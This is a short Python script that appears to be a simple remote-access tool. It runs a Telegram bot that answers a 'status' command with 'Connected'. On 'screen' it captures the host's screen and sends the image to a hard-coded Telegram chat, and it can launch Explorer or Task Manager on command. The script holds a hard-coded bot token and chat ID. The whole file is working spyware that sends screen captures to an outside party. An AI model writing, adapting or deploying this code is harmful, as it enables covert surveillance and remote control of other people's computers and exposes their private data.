import telebot
import pyscreenshot
import subprocess

bot = telebot.TeleBot('2100088568:AAF0celPdRTWGUuuTQeM6Ru44tzqya8R5ME')

@bot.message_handler(content_types=['text'])

def get_text_message(message):
    if message.text == "status":
        bot.send_message(message.from_user.id, "Connected")

    if message.text == "screen":
        img = pyscreenshot.grab()
        name = "temp.png"
        img.save(name)
        bot.send_document(chat_id=1360860728, document=open(name, "rb"))

    if message.text == "open.explorer":
        subprocess.Popen('explorer')

    if message.text == "open.taskmgr":
        subprocess.Popen('taskmgr')

bot.polling(none_stop=True, interval=0)